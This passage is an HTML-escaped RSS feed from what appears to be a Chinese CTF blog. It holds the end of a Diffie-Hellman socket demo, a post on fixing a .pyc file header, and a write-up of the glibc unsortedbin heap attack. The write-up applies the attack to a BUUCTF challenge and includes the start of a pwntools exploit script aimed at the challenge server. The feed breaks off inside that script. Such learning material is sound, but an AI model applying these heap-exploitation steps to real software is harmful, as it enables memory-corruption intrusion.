data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;generate_shared_secret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; public_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 计算共享密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;public_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建 Socket 对象&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AF_INET&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SOCK_STREAM&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 连接服务器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;host &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8000&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;已连接到服务器。主机:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;端口:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 接收服务器端发送的 p 和 g&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;g &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成客户端的私钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;XA &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randint&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;客户端的私钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;XA&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成客户端的公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;public_key_client &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; generate_public_key&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; XA&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;客户端的公钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;public_key_client&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 发送公钥给服务器端&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;public_key_client&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 接收服务器端发送的共享密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;public_key_server&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成客户端的共享密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shared_secret_client &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; generate_shared_secret&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; public_key_server&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; XA&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 输出客户端的共享密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;客户端的共享密钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; shared_secret_client&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 关闭连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/</guid>
            <title>pyc文件头修复</title>
            <link>http://example.com/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/</link>
            <pubDate>Sat, 13 May 2023 16:45:51 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;首先题目给了 pyc 文件为 python 37&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164118025.png&#34; alt=&#34;image-20230513164118025&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后 010editor 打开&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164147988.png&#34; alt=&#34;image-20230513164147988&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现文件头为 00  到 E3 那里都是 0  猜测文件头损坏&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;enum PycMagic &amp;#123;
    MAGIC_1_0 = 0x00999902,
    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */
    MAGIC_1_3 = 0x0A0D2E89,
    MAGIC_1_4 = 0x0A0D1704,
    MAGIC_1_5 = 0x0A0D4E99,
    MAGIC_1_6 = 0x0A0DC4FC,

    MAGIC_2_0 = 0x0A0DC687,
    MAGIC_2_1 = 0x0A0DEB2A,
    MAGIC_2_2 = 0x0A0DED2D,
    MAGIC_2_3 = 0x0A0DF23B,
    MAGIC_2_4 = 0x0A0DF26D,
    MAGIC_2_5 = 0x0A0DF2B3,
    MAGIC_2_6 = 0x0A0DF2D1,
    MAGIC_2_7 = 0x0A0DF303,

    MAGIC_3_0 = 0x0A0D0C3A,
    MAGIC_3_1 = 0x0A0D0C4E,
    MAGIC_3_2 = 0x0A0D0C6C,
    MAGIC_3_3 = 0x0A0D0C9E,
    MAGIC_3_4 = 0x0A0D0CEE,
    MAGIC_3_5 = 0x0A0D0D16,
    MAGIC_3_5_3 = 0x0A0D0D17,
    MAGIC_3_6 = 0x0A0D0D33,
    MAGIC_3_7 = 0x0A0D0D42,
    MAGIC_3_8 = 0x0A0D0D55,
    MAGIC_3_9 = 0x0A0D0D61,
&amp;#125;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这些事常用的 python 文件头  修改文件头为 MAGIC_3_7 注意小端序也就是 42 0D 0D 0A&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164325195.png&#34; alt=&#34;image-20230513164325195&#34;&gt;&lt;/p&gt;
&lt;p&gt;uncompyle6 -o &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rlc3QucHk=&#34;&gt;test.py&lt;/span&gt; 2.pyc&lt;/p&gt;
&lt;p&gt;然后使用 uncompyle6 即可成功反编译出来源码  uncompyle6 使用 pip install uncompyle6 安装&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/05/11/unsorted%20bin%20attack/</guid>
            <title>unsortedbin attack</title>
            <link>http://example.com/2023/05/11/unsorted%20bin%20attack/</link>
            <pubDate>Thu, 11 May 2023 21:26:54 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;unsortedbin-attack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unsortedbin-attack&#34;&gt;#&lt;/a&gt; unsortedbin attack&lt;/h2&gt;
&lt;p&gt;Unsorted Bin Attack 从字面上就可以看出，正合适一种针对 Unsorted Bin 机制的攻击手法。这种攻击手法实现的前提是能够控制挂进 unsorted bin 中的 chunk 的 bk 指针，在控制 bk 指针的情况下可以实现修改任意地址值为一个较大的数值&lt;/p&gt;
&lt;p&gt;首先没有 chunk 挂入的时候 unsorted bin 的 fd 和 bk 指向自己&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511195726092.png&#34; alt=&#34;image-20230511195726092&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果有一个 chunk 进入 unsorted bin 时那么该春 chunk 的 fd 和 bk 都会指向 unsorted bin&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200319409.png&#34; alt=&#34;image-20230511200319409&#34;&gt;&lt;/p&gt;
&lt;p&gt;fd 和 bk 指向 unsortedbin 的头&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200339778.png&#34; alt=&#34;image-20230511200339778&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果你修改 chunk400 的 bk 为 magic-0x10  也就是你 free 之后的 chunk_400 的 bk 为 magic-0x10 那么你就可以修改 magic 的值为较大值&lt;/p&gt;
&lt;p&gt;为什么减去 0x10  因为 magic 的地址是 magic 的存储地址  而减去 0x10 之后的值才是 magic 的 malloc 之后的头地址  也就是 prev_size 的地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511202116589.png&#34; alt=&#34;image-20230511202116589&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后你重新申请一个堆块  假设 chunk_400 的大小为 0x80  那么你重新申请一个 0x80 大小的堆块  就会把 chunl_400 申请走&lt;/p&gt;
&lt;p&gt;然后 magic-0x10 的这个堆块还在 那么 unsorted bin 的 fd 和 bk 就会指向 magic-0x10 的地方  然后 magic-0x10 的 fd 指针也就是 magic&lt;/p&gt;
&lt;p&gt;就会指向 unsorted bin  同时 magic 的值就会改变为较大的值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203517278.png&#34; alt=&#34;image-20230511203517278&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改前 chunk2 的 fd 和 bk 指向 unsorted bin 的头&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203637349.png&#34; alt=&#34;image-20230511203637349&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改后 chunk2 的 bk 指向 0x602090 也就是 magic-0x10 处   magic 为 0x6020c0&lt;/p&gt;
&lt;p&gt;这个是修改前的 0x6020c0 的大小&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511204039362.png&#34; alt=&#34;image-20230511204039362&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511212336461.png&#34; alt=&#34;image-20230511212336461&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个是修改后的 0x6020c0 的大小&lt;/p&gt;
&lt;p&gt;add (0x80,‘dddd’)  只有申请一个新的堆块之后才能修改 magic 的值&lt;/p&gt;
&lt;p&gt;具体看前面  已经说过了&lt;/p&gt;
&lt;p&gt;buuctf hitcontraining_magicheap&lt;/p&gt;
&lt;p&gt;// 题目的 magic 地址为 0x6020c0  但是打远程的时候是 0x6020a0 不清楚为什么&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142800500.png&#34; alt=&#34;image-20230509142800500&#34;&gt;&lt;/p&gt;
&lt;p&gt;没有限制输入的数组大小所以存在堆溢出&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142849458.png&#34; alt=&#34;image-20230509142849458&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# r=process(&#34;1&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;26699&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Heap : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;heap:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;span class=&#34;token 